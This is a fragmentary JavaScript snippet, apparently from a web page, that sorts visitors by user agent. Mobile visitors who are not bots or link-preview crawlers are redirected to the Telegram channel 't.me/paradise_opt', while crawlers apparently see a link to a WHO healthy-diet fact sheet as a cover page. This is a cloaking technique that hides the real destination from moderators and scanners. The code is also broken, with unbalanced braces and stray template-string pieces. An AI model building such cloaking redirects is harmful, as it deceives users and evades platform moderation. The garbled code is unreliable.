    const isRealUser = () => {

      const isMobile = /android|iphone|ipad|ipod|mobile/.test(ua);
      const isBot = /bot|facebook|crawler|preview|google|whatsapp|vk|telegram/.test(ua);
      return isMobile && !isBot;
    };

      location.href = "https://t.me/paradise_opt";

          https://www.who.int/ru/news-room/fact-sheets/detail/healthy-diet
        </a>
      `);
    }
